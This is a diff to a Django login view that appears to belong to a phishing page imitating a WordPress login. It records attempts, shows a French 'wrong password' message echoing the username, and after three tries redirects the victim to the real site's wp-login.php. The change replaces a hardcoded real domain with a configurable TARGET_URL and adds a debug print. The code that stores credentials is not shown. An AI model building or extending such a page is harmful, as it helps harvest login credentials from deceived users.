@@ -9,6 +9,7 @@ from django.template.loader import render_to_string
 
 
 def login(request):
+    print(settings.TARGET_URL)
     if request.method=="POST":
 
         login = Login()
@@ -34,7 +35,7 @@ def login(request):
             request.session['delay'] = 1
         if request.session['delay'] == 3:
             # request.session.set_expiry(5*2) # 5 seconds
-            return redirect("https://www.veolocation.com/wp-login.php")
+            return redirect(f"{settings.TARGET_URL}/wp-login.php")
         messages.info(request, f"Erreur : ce mot de passe ne correspond pas à l’identifiant {request.POST['username']}.")
 
     return render(request, 'loginpage/login.html', {})
